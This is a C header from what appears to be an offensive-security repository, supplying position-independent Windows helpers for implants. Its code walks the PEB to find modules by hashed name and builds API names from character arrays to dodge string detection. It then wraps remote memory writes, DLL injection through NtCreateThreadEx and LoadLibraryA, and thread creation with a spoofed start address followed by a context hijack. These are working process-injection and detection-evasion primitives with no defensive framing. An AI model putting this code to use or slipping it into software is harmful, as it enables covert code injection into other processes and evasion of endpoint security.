// https://raw.githubusercontent.com/paranoidninja/PIC-Get-Privileges/main/addresshunter.h
#define _CRT_SECURE_NO_WARNINGS 1

#include <windows.h>
#include <inttypes.h>
#include <TlHelp32.h>


#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

#define KERNELBASE_HASH 0xc42f2982
#define KERNEL32DLL_HASH 0xbc5d4571
#define MSVCRTDLL_HASH 0xc3222c90
#define ADVAPI32DLL_HASH 0x8353484b
#define NTDLL_HASH 0x4f576ca1
#define MSHTML_HASH 0xf60d3eb8

#define FH_RND_SEED 0xDC072B8A
#define ROL8(v) (v << 8 | v >> 24)
#define ROR8(v) (v >> 8 | v << 24)
#define ROX8(v) ((FH_RND_SEED % 2) ? ROL8(v) : ROR8(v))

// Internal types
typedef LPVOID(WINAPI* HeapAllocType)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
typedef LPVOID(WINAPI* HeapReAllocType)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
typedef BOOL(WINAPI* HeapFreeType)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
typedef HANDLE(WINAPI* GetProcessHeapType)();
typedef SIZE_T(WINAPI* VirtualQueryType)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
typedef HANDLE(WINAPI* OpenProcessType)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef DWORD(WINAPI* GetCurrentProcessIdType)();
typedef HMODULE(WINAPI* LoadLibraryAType)(LPCSTR lpLibFileName);
typedef void(WINAPI* SleepType)(DWORD dwMilliseconds);
typedef BOOL(WINAPI* TerminateProcessType)(HANDLE hProcess, UINT uExitCode);
#define KillProcType TerminateProcessType

typedef DWORD(WINAPI* ResumeThreadType)(HANDLE hThread);
typedef BOOL(WINAPI* GetThreadContextType)(HANDLE hThread, LPCONTEXT lpContext);
typedef BOOL(WINAPI* SetThreadContextType)(HANDLE hThread, const CONTEXT* lpContext);
typedef BOOL(WINAPI* VirtualFreeType)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef LPVOID(WINAPI* VirtualAllocType)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* WriteProcessMemoryType)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* OpenProcessType)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef LPVOID(WINAPI* VirtualAllocExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE(WINAPI* CreateThreadType)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef NTSTATUS(NTAPI* NtCreateThreadExType)(PHANDLE, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, LPVOID);
typedef BOOL(WINAPI* TerminateThreadType)(HANDLE hThread, DWORD dwExitCode);
typedef BOOL(WINAPI* VirtualProtectExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

typedef PIMAGE_RUNTIME_FUNCTION_ENTRY PERF;

typedef struct _dll {

    HMODULE                 Handle;
    UINT64                  TextSectionAddress;
    UINT64                  TextSectionSize;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory;
    PERF                    ExceptionTable;
    DWORD                   ExceptionTableLastEntryIndex;

} DLL, * PDLL;

//redefine UNICODE_STR struct
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

//redefine PEB_LDR_DATA struct
typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

//redefine LDR_DATA_TABLE_ENTRY struct
typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//redefine PEB_FREE_BLOCK struct
typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

//redefine PEB struct
typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

uintptr_t GetRemoteImageBase(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    MODULEENTRY32 me = { sizeof me };
    if (Module32First(hSnap, &me)) {
        CloseHandle(hSnap);
        return (uintptr_t)me.modBaseAddr;
    }
    CloseHandle(hSnap);
    return 0;
}

DWORD HashModule(PCSTR ModuleName, size_t length)
{
    DWORD i = 0;
    DWORD Hash = FH_RND_SEED;

    while (i < length / 2)
    {
        WORD PartialName = *(WORD*)((ULONG64)ModuleName + i++) | 0x20202020;
        Hash ^= PartialName + ROR8(Hash);
    }
    return Hash;
}

// function to fetch the base address of a Mmodule from the Process Environment Block
UINT64 GetModule(DWORD TargetHash) {
    ULONG_PTR dll, val1;
    PWSTR val2;
    USHORT usCounter;
    // We want to stop when we find this
    DWORD firstHash = 0;

    // PEB is at 0x60 offset and __readgsqword is compiler intrinsic,
    // so we don't need to extract it's symbol
    dll = __readgsqword(0x60);

    dll = (ULONG_PTR)((_PPEB)dll)->pLdr;
    val1 = (ULONG_PTR)((PPEB_LDR_DATA)dll)->InMemoryOrderModuleList.Flink;

    while (NULL != val1) {
        val2 = (PWSTR)((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
        usCounter = (USHORT)((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.Length;

        //calculate the hash of module
        DWORD Hash = HashModule((PCSTR)val2, usCounter);
        if (firstHash == 0) {
            firstHash = Hash;
        }
        else if (firstHash == Hash) {
            break;
        }

        //wprintf(L"%s: %u\n --> Hash: %x - Target: %x\n", (WCHAR*)val2, usCounter, Hash, TargetHash);

        // compare the hash of module
        if (Hash == TargetHash) {
            //return module address if found
            dll = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
            return dll;
        }
        val1 = DEREF(val1);
    }
    return 0;
}

// custom strcmp function since this function will be called by GetSymbolAddress
// which means we have to call strcmp before loading msvcrt.dll
// so we are writing our own my_strcmp so that we don't have to play with egg or chicken dilemma
int my_strcmp(const char* p1, const char* p2) {
    const unsigned char* s1 = (const unsigned char*)p1;
    const unsigned char* s2 = (const unsigned char*)p2;
    unsigned char c1, c2;
    do {
        c1 = (unsigned char)*s1++;
        c2 = (unsigned char)*s2++;
        if (c1 == '\0') {
            return c1 - c2;
        }
    } while (c1 == c2);
    return c1 - c2;
}

UINT64 GetFirstModule() {
    ULONG_PTR dll, val1;

    dll = __readgsqword(0x60);
    dll = (ULONG_PTR)((_PPEB)dll)->pLdr;
    val1 = (ULONG_PTR)((PPEB_LDR_DATA)dll)->InMemoryOrderModuleList.Flink;
    dll = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
    return dll;
}

VOID GetModuleTextSection(PDLL dllObject) {
    
    dllObject->Handle = (HMODULE)GetFirstModule();

    if (NULL != dllObject) {
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllObject->Handle + ((PIMAGE_DOS_HEADER)dllObject->Handle)->e_lfanew);

        WORD nSections = ntHeaders->FileHeader.NumberOfSections;
        PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < nSections; i++)
        {

            if (!my_strcmp((char*)Section->Name, (char*)".text")) {
                
                dllObject->TextSectionAddress = Section->VirtualAddress;
                dllObject->TextSectionSize = Section->SizeOfRawData;
                break;
            }
            Section++;
        }
    }
}


UINT64 GetSymbolAddress(HMODULE hModule, LPCSTR lpProcName) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0,
        exportedAddressTable = 0,
        namePointerTable = 0,
        ordinalTable = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    exportedAddressTable = (dllAddress + exportDirectory->AddressOfFunctions);
    namePointerTable = (dllAddress + exportDirectory->AddressOfNames);
    ordinalTable = (dllAddress + exportDirectory->AddressOfNameOrdinals);

    if (((UINT64)lpProcName & 0xFFFF0000) == 0x00000000) {
        exportedAddressTable += ((IMAGE_ORDINAL((UINT64)lpProcName) - exportDirectory->Base) * sizeof(DWORD));
        symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
    }
    else {
        DWORD dwCounter = exportDirectory->NumberOfNames;
        while (dwCounter--) {
            char* cpExportedFunctionName = (char*)(dllAddress + DEREF_32(namePointerTable));
            if (my_strcmp(cpExportedFunctionName, lpProcName) == 0) {
                exportedAddressTable += (DEREF_16(ordinalTable) * sizeof(DWORD));
                symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
                break;
            }
            namePointerTable += sizeof(DWORD);
            ordinalTable += sizeof(WORD);
        }
    }

    return symbolAddress;
}

UINT64 GetSymbolOffset(HMODULE hModule, LPCSTR lpProcName) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0,
        exportedAddressTable = 0,
        namePointerTable = 0,
        ordinalTable = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    exportedAddressTable = (dllAddress + exportDirectory->AddressOfFunctions);
    namePointerTable = (dllAddress + exportDirectory->AddressOfNames);
    ordinalTable = (dllAddress + exportDirectory->AddressOfNameOrdinals);

    if (((UINT64)lpProcName & 0xFFFF0000) == 0x00000000) {
        exportedAddressTable += ((IMAGE_ORDINAL((UINT64)lpProcName) - exportDirectory->Base) * sizeof(DWORD));
        symbolAddress = (UINT64)DEREF_32(exportedAddressTable);
    }
    else {
        DWORD dwCounter = exportDirectory->NumberOfNames;
        while (dwCounter--) {
            char* cpExportedFunctionName = (char*)(dllAddress + DEREF_32(namePointerTable));
            if (my_strcmp(cpExportedFunctionName, lpProcName) == 0) {
                exportedAddressTable += (DEREF_16(ordinalTable) * sizeof(DWORD));
                symbolAddress = (UINT64)DEREF_32(exportedAddressTable);
                break;
            }
            namePointerTable += sizeof(DWORD);
            ordinalTable += sizeof(WORD);
        }
    }

    return symbolAddress;
}

char* GetSymbolNameByOffset(HMODULE hModule, UINT64 offset) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    LPDWORD exportedAddressTable = (LPDWORD)(dllAddress + exportDirectory->AddressOfFunctions);
    LPDWORD namePointerTable = (LPDWORD)(dllAddress + exportDirectory->AddressOfNames);
    LPWORD ordinalTable = (LPWORD)(dllAddress + exportDirectory->AddressOfNameOrdinals);

    char* currProcName;

    for (SIZE_T i = 0; i < exportDirectory->NumberOfNames; i++) {
        // Get current function name
        currProcName = (LPSTR)((LPBYTE)hModule + namePointerTable[i]);

        // Get current function address
        if (exportedAddressTable[ordinalTable[i]] == offset) {
            return currProcName;
        }
        
    }

    return NULL;
}


PVOID GetExceptionDirectoryAddress(HMODULE hModule, DWORD* tSize)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + dosHeader->e_lfanew);
    DWORD64 exceptionDirectoryRVA = ntHeader->OptionalHeader.DataDirectory[3].VirtualAddress;
    *tSize = ntHeader->OptionalHeader.DataDirectory[3].Size;
    DWORD64 imageExceptionDirectory = (DWORD64)((DWORD_PTR)hModule + exceptionDirectoryRVA);
    return (PVOID)imageExceptionDirectory;
    
}

PVOID GetExportDirectoryAddress(HMODULE hModule)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + dosHeader->e_lfanew);
    DWORD_PTR exportDirectoryRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD64 imageExportDirectory = (DWORD64)((DWORD_PTR)hModule + exportDirectoryRVA);

    return (PVOID)imageExportDirectory;
}

HANDLE PICGetProcessHeap() {
    HMODULE hModule = (HMODULE)GetModule(KERNEL32DLL_HASH);
    GetProcessHeapType GetProcessHeapFp;
    CHAR GetProcessHeapName[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p', '\0' };
    GetProcessHeapFp = (GetProcessHeapType)GetProcAddress(hModule, GetProcessHeapName);
    return GetProcessHeapFp();
}

PVOID PICHeapAlloc(SIZE_T nBytes) {
    HMODULE hModule = (HMODULE)GetModule(KERNEL32DLL_HASH);
    HeapAllocType HeapAllocFp;
    CHAR HeapAllocName[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c', '\0' };
    HeapAllocFp = (HeapAllocType)GetProcAddress(hModule, HeapAllocName);

    return HeapAllocFp(PICGetProcessHeap(), 0, nBytes);


}
BOOL PICHeapFree(LPVOID mem) {
    HMODULE hModule = (HMODULE)GetModule(KERNEL32DLL_HASH);
    HeapFreeType HeapFreeFp;
    CHAR HeapFreeName[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e', '\0' };
    HeapFreeFp = (HeapFreeType)GetProcAddress(hModule, HeapFreeName);
    return HeapFreeFp(PICGetProcessHeap(), 0, mem);
}

PVOID PICHeapRealloc(LPVOID mem, SIZE_T nBytes) {
    HMODULE hModule = (HMODULE)GetModule(KERNEL32DLL_HASH);
    HeapReAllocType HeapReAllocFp;
    CHAR HeapReAllocName[] = { 'H', 'e', 'a', 'p', 'R', 'e', 'A', 'l', 'l', 'o', 'c', '\0' };
    HeapReAllocFp = (HeapReAllocType)GetProcAddress(hModule, HeapReAllocName);

    return HeapReAllocFp(PICGetProcessHeap(), 0, mem, nBytes);

}

BOOL PICVirtualFree(LPVOID lpBaseAddress) {
    HMODULE hModule = (HMODULE)GetModule(KERNELBASE_HASH);

    CHAR VirtualFreeName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0' };
    VirtualFreeType VirtualFreeFp;
    VirtualFreeFp = (VirtualFreeType)GetSymbolAddress(hModule, VirtualFreeName);

    return VirtualFreeFp(lpBaseAddress, 0, MEM_RELEASE);

}

PVOID PICVirtualAlloc(SIZE_T dwSize, DWORD protection) {
    HMODULE hModule = (HMODULE)GetModule(KERNELBASE_HASH);

    CHAR VirtualAllocName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
    VirtualAllocType VirtualAllocFp;
    VirtualAllocFp = (VirtualAllocType)GetSymbolAddress(hModule, VirtualAllocName);

    return VirtualAllocFp(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, protection);

}

PVOID PICVirtualAllocEx(HANDLE pHandle, SIZE_T dwSize, DWORD protection) {
    HMODULE hModule = (HMODULE)GetModule(KERNELBASE_HASH);

    CHAR VirtualAllocExName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0' };
    VirtualAllocExType VirtualAllocFp;
    VirtualAllocFp = (VirtualAllocExType)GetSymbolAddress(hModule, VirtualAllocExName);

    return VirtualAllocFp(pHandle, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, protection);

}

BOOL PICVirtualProtectEx(HANDLE pHandle, LPVOID lpBaseAddress, SIZE_T dwSize, DWORD protection) {
    HMODULE hModule = (HMODULE)GetModule(KERNELBASE_HASH);

    CHAR VirtualProtectExName[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 'E', 'x', '\0' }; 
    VirtualProtectExType VirtualProtectFp;
    VirtualProtectFp = (VirtualProtectExType)GetSymbolAddress(hModule, VirtualProtectExName);
    DWORD oldProtection;
    return VirtualProtectFp(pHandle, lpBaseAddress, dwSize, protection, &oldProtection);

}


PVOID PICCreateThread(LPVOID lpStartAddress, LPVOID fakeStartAddress, LPVOID lpParameter) {
    CONTEXT ctx;
    BOOL    ctxRet   = FALSE;

    HMODULE kbModule = (HMODULE)GetModule(KERNELBASE_HASH);
    HMODULE ntModule = (HMODULE)GetModule(NTDLL_HASH);

    CHAR CreateThreadName[]     = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '\0' };
    CHAR GetThreadContextName[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', '\0' };
    CHAR SetThreadContextName[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', '\0' };
    CHAR ResumeThreadName[]     = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };

    NtCreateThreadExType NtCreateThreadExFp;
    GetThreadContextType GetThreadContextFp;
    SetThreadContextType SetThreadContextFp;
    ResumeThreadType     ResumeThreadFp;
    
    ctx.ContextFlags   = CONTEXT_ALL;

    NtCreateThreadExFp = (NtCreateThreadExType)GetSymbolAddress(ntModule, CreateThreadName);
    
    GetThreadContextFp = (GetThreadContextType)GetSymbolAddress(kbModule, GetThreadContextName);
    SetThreadContextFp = (SetThreadContextType)GetSymbolAddress(kbModule, SetThreadContextName);
    ResumeThreadFp     = (ResumeThreadType)GetSymbolAddress(kbModule, ResumeThreadName);

    HANDLE hThread     = INVALID_HANDLE_VALUE;

    NTSTATUS status    = NtCreateThreadExFp(&hThread, THREAD_ALL_ACCESS, 0, (HANDLE)-1, (LPTHREAD_START_ROUTINE)fakeStartAddress /* Start address */, 0, 0x1 /* Suspended */, 0, 0, 0, 0);

    // __debugbreak();
    ctxRet = GetThreadContextFp(hThread, &ctx);
    if (!ctxRet) {
        return NULL;
    }

    ctx.Rcx = (DWORD64)lpStartAddress;
    ctx.R9 = (DWORD64)lpParameter;
    
    ctxRet = SetThreadContextFp(hThread, &ctx);
    if (!ctxRet) {
        return NULL;
    }

    ResumeThreadFp(hThread);
    
    return (PVOID)hThread;
}

HANDLE PICOpenProcess(DWORD pPid) {

    HANDLE hProcess = (HANDLE)-1;
    HMODULE kbModule = (HMODULE)GetModule(KERNELBASE_HASH);
    OpenProcessType      OpenProcessFp;
    CHAR OpenProcessName[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
    OpenProcessFp = (OpenProcessType)GetSymbolAddress(kbModule, OpenProcessName);
    hProcess = OpenProcessFp(PROCESS_ALL_ACCESS|PROCESS_VM_OPERATION, FALSE, pPid);
    return hProcess;
}

SIZE_T PICCopyMemory(HANDLE pHandle, LPVOID lpAddress, LPCVOID lpBuffer, SIZE_T dwSize) {

    HMODULE kbModule = (HMODULE)GetModule(KERNELBASE_HASH);
    WriteProcessMemoryType WriteProcessMemoryFp;
    CHAR WriteProcessMemoryName[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    WriteProcessMemoryFp = (WriteProcessMemoryType)GetProcAddress(kbModule, WriteProcessMemoryName);
    SIZE_T bytesWritten;
    WriteProcessMemoryFp(pHandle, lpAddress, lpBuffer, dwSize, &bytesWritten);
    
    return bytesWritten;
}

PVOID PICInjectDllProcess(HANDLE hProcess, LPVOID lpLibraryNameAddress) {
    HMODULE                 kbModule            = (HMODULE)GetModule(KERNELBASE_HASH);
    HMODULE                 ntModule            = (HMODULE)GetModule(NTDLL_HASH);
    HANDLE                  hThread             = INVALID_HANDLE_VALUE;

    CHAR                    CreateThreadName[]  = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '\0' };
    CHAR                    LoadLibraryAName[]  = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
    
    NtCreateThreadExType    NtCreateThreadExFp;
    LoadLibraryAType        LoadLibraryAFp;
    
    NtCreateThreadExFp                          = (NtCreateThreadExType)GetSymbolAddress(ntModule, CreateThreadName);
    LoadLibraryAFp                              = (LoadLibraryAType)GetSymbolAddress(kbModule, LoadLibraryAName);

    NTSTATUS                status              = NtCreateThreadExFp(
        &hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryAFp /* Start address */, (LPVOID)lpLibraryNameAddress, FALSE, 0, 0, 0, 0
    );

    return (PVOID)hThread;
}

PVOID PICCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID fakeStartAddress, LPVOID lpParameter) {
    CONTEXT ctx;
    BOOL    ctxRet   = FALSE;

    HMODULE kbModule            = (HMODULE)GetModule(KERNELBASE_HASH);
    HMODULE ntModule            = (HMODULE)GetModule(NTDLL_HASH);

    CHAR CreateThreadName    [] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '\0' };
    CHAR GetThreadContextName[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', '\0' };
    CHAR SetThreadContextName[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', '\0' };
    CHAR ResumeThreadName    [] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };

    NtCreateThreadExType NtCreateThreadExFp;
    GetThreadContextType GetThreadContextFp;
    SetThreadContextType SetThreadContextFp;
    ResumeThreadType     ResumeThreadFp;
    
    ctx.ContextFlags   = CONTEXT_ALL;

    NtCreateThreadExFp = (NtCreateThreadExType)GetSymbolAddress(ntModule, CreateThreadName);
    
    GetThreadContextFp = (GetThreadContextType)GetSymbolAddress(kbModule, GetThreadContextName);
    SetThreadContextFp = (SetThreadContextType)GetSymbolAddress(kbModule, SetThreadContextName);
    ResumeThreadFp     = (ResumeThreadType)GetSymbolAddress(kbModule, ResumeThreadName);

    HANDLE hThread     = INVALID_HANDLE_VALUE;

    NTSTATUS status    = NtCreateThreadExFp(&hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE)fakeStartAddress /* Start address */, 0, 0x1 /* Suspended */, 0, 0, 0, 0);

    // __debugbreak();
    ctxRet = GetThreadContextFp(hThread, &ctx);
    if (!ctxRet) {
        return NULL;
    }

    ctx.Rcx = (DWORD64)lpStartAddress;
    ctx.R15 = (DWORD64)lpParameter;
    
    ctxRet = SetThreadContextFp(hThread, &ctx);
    if (!ctxRet) {
        return NULL;
    }

    ResumeThreadFp(hThread);
    
    return (PVOID)hThread;
}

BOOL PICTerminateThread(HANDLE hThread) {
    HMODULE hModule = (HMODULE)GetModule(KERNELBASE_HASH);

    CHAR TerminateThreadName[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
    TerminateThreadType TerminateThreadFp;
    TerminateThreadFp = (TerminateThreadType)GetProcAddress(hModule, TerminateThreadName);

    return TerminateThreadFp(hThread, 0);

}


int atoi(char* str)
{
    // Initialize result
    int res = 0;
    int start_index = 0;
    // Iterate through all characters
    // of input string and update result
    // take ASCII character of corresponding digit and
    // subtract the code from '0' to get numerical
    // value and multiply res by 10 to shuffle
    // digits left to update running total
    for (int i = 0; str[i] != '\0'; i++)
        if ((str[i] == ' ') || (str[i] == '\0')){
            start_index = i + 1;
            break;
        }
    
    for (int i = start_index; str[i] != '\0'; ++i){
        if ((str[i] == '0') || (str[i] == '1') || (str[i] == '2') || (str[i] == '3') || (str[i] == '4') || (str[i] == '5') || (str[i] == '6') || (str[i] == '7') || (str[i] == '8') || (str[i] == '9')){
            res = res * 10 + str[i] - '0';
        }
    }

    // return result.
    return res;
}

